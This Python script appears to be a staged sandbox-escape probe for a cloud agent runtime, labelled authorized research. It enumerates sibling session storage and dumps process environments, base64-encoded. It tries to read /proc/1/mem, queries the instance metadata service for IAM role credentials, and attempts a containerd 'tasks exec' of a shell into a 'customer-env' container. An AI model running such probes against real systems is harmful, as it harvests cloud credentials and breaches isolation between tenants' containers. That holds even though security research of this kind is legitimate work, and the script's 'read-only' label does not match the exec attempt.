"""
probe_stage3_findings.py — multi-finding Stage 3 probe for 11-3.

Runs 4 sub-probes in a single shell-tool invocation:
  (B) /mnt/agentcoresessionstorage/N sibling-index enumeration
  (C) EFS / S3Files mount-path validation surface (PID 1 environ + bind-mounts)
  (F) Legacy primitives re-verification on new containerd substrate:
        /proc/1/mem readability, containerd.sock visibility, ctr binary,
        IMDSv2 exec-role creds reachable, customer-env CinC reachable
  (X) Bonus: kernel + namespaces + cgroup + adjacent containerd task IDs

Read-only. Authorized research; account owner is the test target.
"""

import os
import sys
import base64
import subprocess


def _b64(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()


def _run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return {
            'rc': r.returncode,
            'stdout': r.stdout[:32 * 1024],
            'stderr': r.stderr[:8 * 1024],
        }
    except subprocess.TimeoutExpired:
        return {'rc': -1, 'stdout': b'', 'stderr': b'<timeout>'}
    except Exception as e:
        return {'rc': -2, 'stdout': b'', 'stderr': f'<{type(e).__name__}:{e}>'.encode()}


def _safe_read(path, max_bytes=64 * 1024):
    try:
        with open(path, 'rb') as f:
            return f.read(max_bytes)
    except Exception as e:
        return f'<read-error:{type(e).__name__}:{e}>'.encode()


def _emit(label, result):
    print(f'{label}_RC={result["rc"]}')
    if result['stdout']:
        print(f'{label}_STDOUT={_b64(result["stdout"])}')
    if result['stderr']:
        print(f'{label}_STDERR={_b64(result["stderr"])}')


def stage_b():
    """Enumerate /mnt/agentcoresessionstorage/N for sibling indices."""
    print('=== B: sibling NFS indices ===')
    _emit('B_LS_MNT', _run(['ls', '-la', '/mnt/']))
    _emit('B_LS_AGENTCORE', _run(['ls', '-la', '/mnt/agentcoresessionstorage/']))
    for n in range(0, 16):
        path = f'/mnt/agentcoresessionstorage/{n}'
        _emit(f'B_LS_{n}', _run(['ls', '-la', path]))
        _emit(f'B_STAT_{n}', _run(['stat', path]))
    _emit('B_DF', _run(['df', '-aTh']))
    _emit('B_MOUNT', _run(['mount']))
    # /proc/1/mountinfo greps
    mountinfo = _safe_read('/proc/1/mountinfo')
    print(f'B_PID1_MOUNTINFO={_b64(mountinfo)}')
    # /proc/self/mountinfo (likely identical, but verify)
    mountinfo_self = _safe_read('/proc/self/mountinfo')
    print(f'B_SELF_MOUNTINFO={_b64(mountinfo_self)}')


def stage_c():
    """EFS / S3Files mount-path observation."""
    print('=== C: EFS/S3 mount paths ===')
    # PID 1 environ — full dump again (no filter), for AWS_EFS / AWS_S3FILES
    environ = _safe_read('/proc/1/environ')
    print(f'C_PID1_ENV={_b64(environ)}')
    # Self environ (shell-tool subprocess) — does it inherit AWS_EFS_*?
    self_env = _safe_read('/proc/self/environ')
    print(f'C_SELF_ENV={_b64(self_env)}')
    # ls likely EFS roots
    _emit('C_LS_MNT_AGENT', _run(['ls', '-la', '/mnt/agent']))
    _emit('C_LS_EFS', _run(['ls', '-la', '/mnt/efs']))
    _emit('C_LS_AWS', _run(['ls', '-la', '/aws']))


def stage_f():
    """Legacy primitives on new substrate."""
    print('=== F: legacy primitive re-verification ===')
    # F.1 /proc/1/mem readability
    _emit('F_DD_MEM_HEAD', _run(
        ['dd', 'if=/proc/1/mem', 'of=/dev/null', 'bs=4096', 'count=1',
         'iflag=skip_bytes', 'skip=0']))
    # Try a slightly higher offset (not 0 — PID 1 unmaps low memory)
    # We'll just attempt the canonical "open and read" via Python:
    try:
        with open('/proc/1/mem', 'rb') as f:
            f.seek(0x7fff00000000)  # high userspace, just see if the seek/read errors
            data = f.read(16)
            print(f'F_PID1_MEM_HIGHSEEK_LEN={len(data)}')
    except Exception as e:
        print(f'F_PID1_MEM_HIGHSEEK_ERR={type(e).__name__}:{e}')
    # F.2 containerd.sock visibility
    for path in ['/run/containerd/containerd.sock',
                 '/var/run/containerd/containerd.sock',
                 '/run/containerd/']:
        _emit(f'F_LS_{path.replace("/", "_")}', _run(['ls', '-la', path]))
    # F.3 ctr binary
    _emit('F_WHICH_CTR', _run(['which', 'ctr']))
    _emit('F_LS_CTR', _run(['ls', '-la', '/usr/local/bin/ctr']))
    _emit('F_CTR_VERSION', _run(['/usr/local/bin/ctr', '--version']))
    _emit('F_CTR_NAMESPACES', _run(['/usr/local/bin/ctr', 'namespaces', 'list']))
    _emit('F_CTR_CONTAINERS', _run(['/usr/local/bin/ctr', 'containers', 'list']))
    _emit('F_CTR_TASKS', _run(['/usr/local/bin/ctr', 'tasks', 'list']))
    _emit('F_CTR_IMAGES', _run(['/usr/local/bin/ctr', 'images', 'list']))
    # ctr with default namespace already; loopy uses default per source
    # F.4 IMDSv2 exec-role creds
    _emit('F_IMDS_TOKEN', _run([
        'curl', '-s', '-m', '5', '-X', 'PUT',
        'http://169.254.169.254/latest/api/token',
        '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 60']))
    # then use the token (we don't have the token here; do it via shell pipeline)
    _emit('F_IMDS_NOAUTH_ROLE', _run([
        'curl', '-s', '-m', '5',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/']))
    # F.5 customer-env CinC reachable?
    _emit('F_CTR_TASK_EXEC_PROBE', _run([
        '/usr/local/bin/ctr', '-a', '/run/containerd/containerd.sock',
        'tasks', 'exec', '--exec-id', 'p11_3_probe', 'customer-env',
        '/bin/sh', '-c', 'echo HELLO_FROM_CINC; id; ls /mnt/']))


def stage_x():
    """Bonus: namespaces, kernel, capabilities."""
    print('=== X: bonus context ===')
    _emit('X_UNAME', _run(['uname', '-a']))
    _emit('X_CAT_OS_RELEASE', _run(['cat', '/etc/os-release']))
    # /proc/1/ns/* — namespace IDs (compare to /proc/self/ns/*)
    for ns in ('cgroup', 'ipc', 'mnt', 'net', 'pid', 'user', 'uts', 'time'):
        _emit(f'X_PID1_NS_{ns}', _run(['readlink', f'/proc/1/ns/{ns}']))
        _emit(f'X_SELF_NS_{ns}', _run(['readlink', f'/proc/self/ns/{ns}']))
    _emit('X_CAT_PROC1_CGROUP', _run(['cat', '/proc/1/cgroup']))
    _emit('X_CAT_PROC1_STATUS_CAPS', _run(['sh', '-c',
        'grep -E "^Cap|^NoNewPrivs|^Seccomp" /proc/1/status']))
    # If /run/containerd is mount-visible, list adjacent task dirs
    _emit('X_LS_CONTAINERD_TASKS',
          _run(['ls', '-la',
                '/run/containerd/io.containerd.runtime.v2.task/default/']))


def main():
    print('PROBE=stage3-findings v1')
    try:
        stage_b()
    except Exception as e:
        print(f'STAGE_B_ERR={type(e).__name__}:{e}')
    try:
        stage_c()
    except Exception as e:
        print(f'STAGE_C_ERR={type(e).__name__}:{e}')
    try:
        stage_f()
    except Exception as e:
        print(f'STAGE_F_ERR={type(e).__name__}:{e}')
    try:
        stage_x()
    except Exception as e:
        print(f'STAGE_X_ERR={type(e).__name__}:{e}')
    print('END')


if __name__ == '__main__':
    main()
